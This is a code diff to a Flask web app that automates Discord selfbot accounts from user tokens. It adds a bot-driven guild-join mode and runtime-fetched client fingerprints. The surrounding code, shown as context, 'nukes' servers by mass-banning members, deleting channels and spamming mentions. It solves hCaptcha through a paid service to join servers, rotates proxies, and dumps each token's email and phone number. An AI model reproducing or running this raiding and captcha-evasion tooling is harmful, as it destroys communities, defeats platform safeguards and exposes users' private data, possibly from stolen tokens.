@@ -1,4 +1,4 @@
-import traceback, threading, requests, datetime, asyncio, discord, random, string, base64, json
+import traceback, threading, requests, datetime, asyncio, aiohttp, discord, random, string, base64, json
 import Proxy
 from flask import Flask, request, redirect, render_template
 from capmonster_python import HCaptchaTask
@@ -11,23 +11,28 @@ logIdBotClass = {}
 stops = []
 failedChannels = []
 DISCORD_API_BASE_URL= "https://discord.com/api/v9"
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36"
-B_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+
+async def getInfo():
+    async with aiohttp.ClientSession() as session:
+        info = await discord.utils._get_info(session)
+        return info
+
+info = asyncio.run(getInfo())
+USER_AGENT = info[0]["browser_user_agent"]
 
 class DiscordApis():
     def __init__(self, logId:str, token:str):
         self.logId = logId
         self.token = token
     def generateXSuperProperties(self):
-        xSuperPropertiesStr = '{"os":"Windows","browser":"Chrome","device":"","system_locale":"ja"\,"browser_user_agent":"'+USER_AGENT+'","browser_version":"127.0.0.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":320705,"client_event_source":null}'
-        return base64.b64encode(xSuperPropertiesStr.encode()).decode()
+        return info[1]
     def generateHeaders(self):
         headers = {
             "user-agent":USER_AGENT,
             "Authorization":self.token,
             "x-super-properties":self.generateXSuperProperties(),
             "accept": "*/*",
-            "accept-language": "ja-JP",
+            "accept-language": "en-US",
             "connection": "keep-alive",
             "DNT": "1",
             "origin": "https://discord.com",
@@ -40,16 +45,16 @@ class DiscordApis():
         return headers
     def generateFingerHeaders(self):
         headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'ja-JP',
-            'Connection': 'keep-alive',
-            'Referer': 'https://discord.com/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-GPC': '1',
-            'User-Agent': USER_AGENT,
-            'X-Track': self.generateXSuperProperties(),
+            "Accept": "*/*",
+            "Accept-Language": "en-US",
+            "Connection": "keep-alive",
+            "Referer": "https://discord.com/",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-GPC": "1",
+            "User-Agent": USER_AGENT,
+            "X-Track": self.generateXSuperProperties(),
         }
         return headers
     def getUserInfo(self):
@@ -58,7 +63,7 @@ class DiscordApis():
     def hcaptchaSolver(self, apikey:str, sitekey:str, data:str, siteUrl="https://discord.com"):
         try:
             capmonster = HCaptchaTask(apikey)
-            capmonster.set_user_agent(B_USER_AGENT)
+            capmonster.set_user_agent(USER_AGENT)
             taskId = capmonster.create_task(siteUrl, sitekey, is_invisible=True, custom_data=data, )
             result = capmonster.join_task_result(taskId)
             return result.get("gRecaptchaResponse")
@@ -67,7 +72,7 @@ class DiscordApis():
             return None
     def joinGuild(self, inviteCode:str, capmonsterApiKey=""):
         headers = self.generateHeaders()
-        res = requests.get('https://discord.com/api/v9/experiments', headers=self.generateFingerHeaders())
+        res = requests.get("https://discord.com/api/v9/experiments", headers=self.generateFingerHeaders())
         fingerprint = res.json()["fingerprint"]
         headers["x-fingerprint"] = fingerprint
         res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=headers)
@@ -107,6 +112,8 @@ class DiscordBot(discord.Client):
         self.exclusionChannelIds = []
         if mode == 0:
             self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionChannelIds, self.channelId = option
+        elif mode == 2:
+            self.inviteCode, self.capmonsterKey = option
         self.mode = mode
     async def banUser(self, user:discord.Member):
         try:
@@ -126,7 +133,7 @@ class DiscordBot(discord.Client):
         logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
     async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
         try:
-            if not (type(channel) in [discord.TextChannel, discord.VoiceChannel, discord.Thread] and channel.slowmode_delay == 0 and channel.permissions_for(self.guild.get_member(self.user.id)).send_messages):
+            if not (type(channel) in [discord.TextChannel, discord.VoiceChannel, discord.Thread] and channel.slowmode_delay == 0 and channel.permissions_for(self.guild.get_member(self.user.id)).send_messages) and not self.channelId:
                 self.exclusionChannelIds.append(str(channel.id))
                 return
             if message[0] == "/":
@@ -252,6 +259,9 @@ class DiscordBot(discord.Client):
                 logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
             except Exception as e:
                 logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
+        elif self.mode == 2:
+            apis = DiscordApis(self.logId, self.token)
+            apis.joinGuild(self.inviteCode, self.capmonsterKey)
     async def on_message(self, message):
         if message.author.bot:
             return
@@ -265,14 +275,14 @@ class DiscordBot(discord.Client):
         except:
             logs[self.logId] += f"Error:\n{traceback.format_exc()}"
 
-@app.route('/getLog', methods=["GET"])
+@app.route("/getLog", methods=["GET"])
 def getLog():
     if request.args.get("id") in logs:
-        return render_template('getLog.html', log=logs[request.args.get("id")])
+        return render_template("getLog.html", log=logs[request.args.get("id")])
     else:
-        return render_template('getLog.html', log="Not found"), 404
+        return render_template("getLog.html", log="Not found"), 404
 
-@app.route('/stop', methods=["GET"])
+@app.route("/stop", methods=["GET"])
 def stop():
     logId = request.args.get("id")
     try:
@@ -282,7 +292,7 @@ def stop():
     stops.append(logId)
     return redirect(request.referrer)
 
-@app.route('/tokenChecker', methods=["GET", "POST"])
+@app.route("/tokenChecker", methods=["GET", "POST"])
 def tokenChecker():
     if request.method == "POST":
         proxy.getProxy()
@@ -299,10 +309,10 @@ def tokenChecker():
                 logs[logId] += f"""====== Token: {token} ======\nID - {userInfo["id"]}\nUserName - {userInfo["username"]}\nGlobalName - {userInfo["global_name"]}\nEmail - {userInfo["email"]}\nPhoneNumber - {userInfo["phone"]}\n\n"""
             else:
                 logs[logId] += f"Error: invalid token - {token}\n\n"
-        return render_template('selfBotTokenChecker.html', logId=logId)
-    return render_template('selfBotTokenChecker.html')
+        return render_template("selfBotTokenChecker.html", logId=logId)
+    return render_template("selfBotTokenChecker.html")
 
-@app.route('/joinGuild', methods=["GET", "POST"])
+@app.route("/joinGuild", methods=["GET", "POST"])
 def joinGuild():
     if request.method == "POST":
         proxy.getProxy()
@@ -318,14 +328,15 @@ def joinGuild():
             userInfo = apis.getUserInfo()
             if userInfo[0]:
                 logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
-                t = threading.Thread(target=apis.joinGuild, args=(guildInviteCode,capmonsterApiKey), daemon=True)
-                t.start()
+                bot = DiscordBot(logId, token, None, None, None, None, [guildInviteCode, capmonsterApiKey], 2)
+                botThread = threading.Thread(target=bot.runBot, daemon=True)
+                botThread.start()
             else:
                 logs[logId] += f"Error: invalid token - {token}\n"
-        return render_template('selfBotJoinGuild.html', logId=logId)
-    return render_template('selfBotJoinGuild.html')
+        return render_template("selfBotJoinGuild.html", logId=logId)
+    return render_template("selfBotJoinGuild.html")
 
-@app.route('/leaveGuild', methods=["GET", "POST"])
+@app.route("/leaveGuild", methods=["GET", "POST"])
 def leaveGuild():
     if request.method == "POST":
         proxy.getProxy()
@@ -346,10 +357,10 @@ def leaveGuild():
                 botThread.start()
             else:
                 logs[logId] += f"Error: invalid token - {token}\n"
-        return render_template('selfBotLeaveGuild.html', logId=logId)
-    return render_template('selfBotLeaveGuild.html')
+        return render_template("selfBotLeaveGuild.html", logId=logId)
+    return render_template("selfBotLeaveGuild.html")
 
-@app.route('/channelNuke', methods=["GET", "POST"])
+@app.route("/channelNuke", methods=["GET", "POST"])
 def channelNuke():
     if request.method == "POST":
         proxy.getProxy()
@@ -378,10 +389,10 @@ RandomMention:{randomMention}
             logIdBotClass[logId] = bot
             botThread = threading.Thread(target=bot.runBot, daemon=True)
             botThread.start()
-        return render_template('selfBotChannelNuke.html', logId=logId)
-    return render_template('selfBotChannelNuke.html')
+        return render_template("selfBotChannelNuke.html", logId=logId)
+    return render_template("selfBotChannelNuke.html")
 
-@app.route('/nuke', methods=["GET", "POST"])
+@app.route("/nuke", methods=["GET", "POST"])
 def nuke():
     if request.method == "POST":
         proxy.getProxy()
@@ -418,8 +429,8 @@ RandomMention:{randomMention}
             logIdBotClass[logId] = bot
             botThread = threading.Thread(target=bot.runBot, daemon=True)
             botThread.start()
-        return render_template('selfBotNuke.html', logId=logId)
-    return render_template('selfBotNuke.html')
+        return render_template("selfBotNuke.html", logId=logId)
+    return render_template("selfBotNuke.html")
 
 def main():
     port = 8081
